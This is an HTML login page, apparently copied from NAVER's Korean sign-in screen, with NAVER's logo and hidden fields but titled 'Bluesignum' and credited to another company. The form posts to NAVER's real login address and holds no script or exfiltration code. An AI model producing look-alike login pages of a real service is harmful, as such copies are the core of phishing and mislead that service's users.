<!DOCTYPE html>
<html lang="ko">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
	<title>Bluesignum</title>
	<link rel="stylesheet" type="text/css" href="./css/login.css">
</head>
<body class="chrome">
<div id="wrap">
    <div id="u_skip">
        <a href="#content" id="u_skip_anchor"><span>본문으로 바로가기</span></a>
    </div>
	<!-- header -->
	<div id="header">
		<h1><a href="https://www.naver.com" class="sp h_logo" id="log.naver" style="background-image: ;"><span class="blind">NAVER</span></a></h1>
		<div class="lang">
			<select id="locale_switch" name="locale_switch" title="언어선택" class="sel">
				<option value="ko_KR" >한국어</option>
				<option value="en_US" >English</option>
			</select>
		</div>
	</div>
	<div id="container">
		<!-- content -->
		<div id="content">
			<div class="title" aria-live="assertive">
				<p></p>
			</div>
				<form id="frmNIDLogin" name="frmNIDLogin" target="_top" AUTOCOMPLETE="off" action="https://nid.naver.com/nidlogin.login" method="POST">
				<input type="hidden" id="localechange" name="localechange" value="">
				<input type="hidden" name="encpw" id="encpw" value="">
<input type="hidden" name="enctp" id="enctp" value="1">
<input type="hidden" name="svctype" id="svctype" value="1">
<input type="hidden" name="smart_LEVEL" id="smart_LEVEL" value="1">
<input type="hidden" name="bvsd" id="bvsd" value="">
<input type="hidden" name="encnm" id="encnm" value="">
<input type="hidden" name="locale" id="locale" value="ko_KR">
<input type="hidden" name="url" id="url" value="https://www.naver.com">

				<fieldset class="login_form">
					<legend class="blind">로그인</legend>
					<div class="id_area">
						<div class="input_row" id="id_area">
							<span class="input_box">
								<label for="id" id="label_id_area" class="lbl">아이디</label>
								<input type="text" id="id" name="id" accesskey="L" placeholder="아이디" class="int" maxlength="41" value="">
							</span>
							<button type="button" disabled="" title="delete" id="id_clear" class="wrg">삭제</button>
						</div>
						<div class="error" id="err_empty_id" style="display:none" aria-live="assertive"></div>
					</div>
					<div class="pw_area">
						<div class="input_row" id="pw_area">
							<span class="input_box">
								<label for="pw" id="label_pw_area"  class="lbl">비밀번호</label>
								<input type="password" id="pw" name="pw" placeholder="비밀번호" class="int" maxlength="16">
							</span>
							<button type="button" disabled="" title="delete" id="pw_clear" class="wrg">삭제</button>
							<div class="ly_v2" id="err_capslock" style="display:none;">
								<div class="ly_box">
									<p><strong>Caps Lock</strong>이 켜져 있습니다.</p>
								</div>
								<span class="sp ly_point"></span>
							</div>
						</div>
						<div class="error" id="err_empty_pw" style="display:none" aria-live="assertive"></div>
					</div>

					<input type="submit" title="로그인" alt="로그인" value="로그인" class="btn_global" id="log.login">
				</fieldset>
			</form>
		<!-- //content -->
	</div>
	<!-- //container -->
	<!-- footer -->
	<div id="footer">
		<address><em><a target="_blank" href="http://www.navercorp.com" class="logo" id="fot.naver"><span class="blind">naver</span></a></em><em class="copy">Copyright</em> <em class="u_cri">&copy;</em> (주)블루시그넘 <span class="all_r">All Rights Reserved.</span></address>
	</div>
	<!-- //footer -->
</div>
<input type="hidden" id="nclicks_nsc" name="nclicks_nsc" value="nid.login_kr">
<input type="hidden" id="nid_buk" name="nid_buk" value="exist">
<input type="hidden" id="ncaptchaSplit" name="ncaptchaSplit" value="none">
<input type="hidden" id="id_error_msg" name="id_error_msg" value="아이디를 입력해주세요.">
<input type="hidden" id="pw_error_msg" name="pw_error_msg" value="비밀번호를 입력해주세요.">
<input type="hidden" id="locale" name="locale" value="ko_KR">
<input type="hidden" id="adult_surl_v2" name="adult_surl_v2" value="">
<div id="nv_stat" style="display:none;">20</div>
</body>
</html>
